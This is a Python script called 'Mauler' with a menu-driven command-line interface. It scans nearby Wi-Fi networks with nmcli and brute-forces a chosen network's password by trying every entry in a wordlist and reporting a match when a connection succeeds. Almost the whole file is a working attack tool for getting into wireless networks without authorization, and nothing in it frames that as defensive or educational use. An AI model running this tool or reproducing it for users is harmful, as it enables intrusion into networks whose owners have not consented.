import subprocess
import time


class Mauler:
    def __init__(self):
        self.debug = True

    def check_wifi_status(self):
        wifi_status = subprocess.Popen(["nmcli","radio", "wifi"], stdout=subprocess.PIPE)
        output, error = wifi_status.communicate()
        if output == b"disabled\n":
           subprocess.Popen(["nmcli","radio", "wifi","on"]).communicate()[0]
           print("Wi-Fi status was disabled, enabling now...")
        if output == b"enabled\n":
           print("Wi-Fi status enabled, Wi-Fi scanner starting...")

    def scan_wifi(self):
        print("Checking wifi-status")
        self.check_wifi_status()
        time.sleep(1)
        subprocess.Popen(["nmcli","dev", "wifi", "list"]).communicate()[0]

    def rescan_wifi(self):
        subprocess.Popen(["nmcli", "dev", "wifi", "list", "--rescan", "yes"]).communicate()[0]

    def connect_to_wifi(self,ssid, password):
        status = subprocess.Popen(["nmcli", "dev", "wifi", "connect", f"{ssid}", "password", f"{password}"], stdout=subprocess.PIPE,stderr=subprocess.PIPE)
        output, error = status.communicate()
        if b"Error" in error:
            print("Non successfull candidate")
        elif b"Connection activation failed" in error:
            print("Possible candidate try manually connecting with that password!")
        elif b"successfully activated with" in output:
            print(f"\t ******PASSWORD FOUND: {password}******")
            return True
        else:
            return False

    def brute_force(self,ssid, wordlist):
        wordlist = open(wordlist, "r")
        possible_passwords=wordlist.readlines()
        for password in possible_passwords:
            password = password.replace("\n", "")
            print(f"Trying password", f"{password}")
            time.sleep(0.5)
            if self.connect_to_wifi(ssid, password) == True:
                wordlist.close()
                break




if __name__ == '__main__':
    mauler = Mauler()
    print("""
#     #                                    
##   ##   ##   #    # #      ###### #####  
# # # #  #  #  #    # #      #      #    # 
#  #  # #    # #    # #      #####  #    # 
#     # ###### #    # #      #      #####  
#     # #    # #    # #      #      #   #  
#     # #    #  ####  ###### ###### #    # 

    1) Scan Wi-Fi
    2) Brute-Force Wi-Fi
    3) Exit""")

    while True:
        option = int(input("#>  "))

        if option == 1:
           mauler.scan_wifi()
           time.sleep(10)
           print("Scanner will automatically scan after 10 seconds")
           mauler.rescan_wifi()

        if option == 2:
           ssid = str(input("Enter SSID/BSSID: "))
           password = input("Enter Wordlist Path: ") 
           mauler.brute_force(ssid, password)

        if option == 3:
           exit() 
